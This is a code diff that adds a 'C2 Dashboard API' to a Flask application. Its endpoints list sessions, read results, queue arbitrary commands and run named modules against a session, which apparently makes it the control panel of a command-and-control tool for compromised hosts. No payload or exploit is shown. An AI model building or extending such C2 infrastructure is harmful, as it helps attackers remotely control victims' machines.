@@ -204,6 +204,64 @@ def process():
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
+# ─── C2 Dashboard API ──────────────────────────────────────────────
+
+@app.route('/api/c2/sessions', methods=['GET'])
+def api_c2_sessions():
+    try:
+        from c2 import session
+        return jsonify(session.list_sessions())
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/c2/results/<session_id>', methods=['GET'])
+def api_c2_results(session_id):
+    try:
+        from c2 import session
+        return jsonify(session.get_results(session_id))
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/c2/command', methods=['POST'])
+def api_c2_command():
+    try:
+        from c2 import session
+        data = request.get_json(force=True, silent=True) or {}
+        sid = data.get('session_id')
+        cmd = data.get('command')
+        if not sid or not cmd:
+            return jsonify({'error': 'Missing session_id or command'}), 400
+        session.queue_command(sid, cmd)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/c2/module', methods=['POST'])
+def api_c2_module():
+    try:
+        import modules
+        from c2 import session
+        data = request.get_json(force=True, silent=True) or {}
+        sid = data.get('session_id')
+        mod_name = data.get('module')
+        mod_args = data.get('args', [])
+        
+        if not sid or not mod_name:
+            return jsonify({'error': 'Missing session_id or module'}), 400
+            
+        sess = session.get_session(sid)
+        if not sess:
+            return jsonify({'error': 'Session not found'}), 404
+            
+        cmd = modules.run_module(mod_name, sess, mod_args)
+        if cmd.startswith("[!]"):
+            return jsonify({'error': cmd}), 400
+            
+        session.queue_command(sid, cmd)
+        return jsonify({'success': True, 'queued_cmd': cmd})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
 @app.route('/download/<filename>')
 def download(filename):
     return send_from_directory(app.config['OUTPUT_FOLDER'], filename)
